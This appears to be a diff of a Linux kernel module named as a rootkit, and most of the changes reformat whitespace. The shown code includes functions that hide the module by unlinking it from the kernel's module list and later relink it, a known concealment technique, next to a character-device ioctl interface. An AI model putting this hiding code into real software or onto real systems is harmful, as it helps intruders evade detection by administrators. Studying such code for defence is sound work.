@@ -16,13 +16,13 @@ static struct list_head *prev_module;
 /**
  * Function Prototypes
 */
-static int  __init rootkit_init(void);
+static int __init rootkit_init(void);
 static void __exit rootkit_exit(void);
 
 /******************* rootkit function **********************/
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg);
-static int  rootkit_open(struct inode *inode, struct file *filp);
-static int  rootkit_release(struct inode *inode, struct file *filp);
+static int rootkit_open(struct inode *inode, struct file *filp);
+static int rootkit_release(struct inode *inode, struct file *filp);
 
 /******************* hide/unhide function ******************/
 static void hide_rootkit(void);
@@ -30,30 +30,30 @@ static void unhide_rootkit(void);
 
 
 const struct file_operations fops = {
-    open:rootkit_open,
-    unlocked_ioctl:rootkit_ioctl,
-    release:rootkit_release,
-    owner:THIS_MODULE
+    	open:rootkit_open,
+    	unlocked_ioctl:rootkit_ioctl,
+    	release:rootkit_release,
+    	owner:THIS_MODULE
 };
 
 
 static void hide_rootkit(void)
 {
-    pr_info("rootkit: hiding rootkit!\n");
-    if (THIS_MODULE->list.prev != NULL){
-        prev_module = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list);
-    }
-    hidden = true;
+    	pr_info("rootkit: hiding rootkit!\n");
+    	if (THIS_MODULE->list.prev != NULL){
+        	prev_module = THIS_MODULE->list.prev;
+        	list_del(&THIS_MODULE->list);
+    	}
+    	hidden = true;
 }
 
 static void unhide_rootkit(void)
 {
-    pr_info("rootkit: revealing rootkit!\n");
-    if (prev_module != NULL) {
-        list_add(&THIS_MODULE->list, prev_module);
-    }
-    hidden = false;
+	pr_info("rootkit: revealing rootkit!\n");
+    	if (prev_module != NULL) {
+        	list_add(&THIS_MODULE->list, prev_module);
+    	}
+    	hidden = false;
 }
 
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
@@ -99,8 +99,8 @@ static int __init rootkit_init(void)
 	int ret;
 	dev_t dev_no, dev;
 
-    /* Initialize variables */
-    hidden = false;
+    	/* Initialize variables */
+    	hidden = false;
 
 	kernel_cdev = cdev_alloc();
 	kernel_cdev->ops = &fops;
@@ -127,8 +127,8 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
 	pr_info("%s: removed\n", OURMODNAME);
-    cdev_del(kernel_cdev);
-    unregister_chrdev_region(major, 1);
+    	cdev_del(kernel_cdev);
+    	unregister_chrdev_region(major, 1);
 }
 
 module_init(rootkit_init);
